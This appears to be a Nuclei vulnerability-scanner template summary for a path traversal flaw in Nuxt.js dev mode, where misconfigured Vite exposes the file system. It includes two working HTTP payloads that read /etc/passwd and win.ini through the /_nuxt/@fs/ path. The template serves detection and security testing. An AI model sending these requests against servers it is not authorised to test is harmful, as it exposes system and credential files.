# Nuclei Template: Arbitrary File Read in Dev Mode - Nuxt.js
**Template ID:** nuxt-js-lfi
**Vulnerability Class:** Path Traversal
**Severity:** High
**CWE:** CWE-22
**Source:** Nuclei Template (`nuxt-js-lfi.yaml`)

## Vulnerability Information & PoC

## Description
Vite is misconfigured within nuxt to permit any file to be retrieved from the file system.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/_nuxt/@fs/etc/passwd
GET {{BaseURL}}/_nuxt/@fs/windows/win.ini
```

## References
- https://huntr.dev/bounties/4849af83-450c-435e-bc0b-71705f5be440/
- https://bryces.io/blog/nuxt3
- https://twitter.com/fofabot/status/1669339995780558849
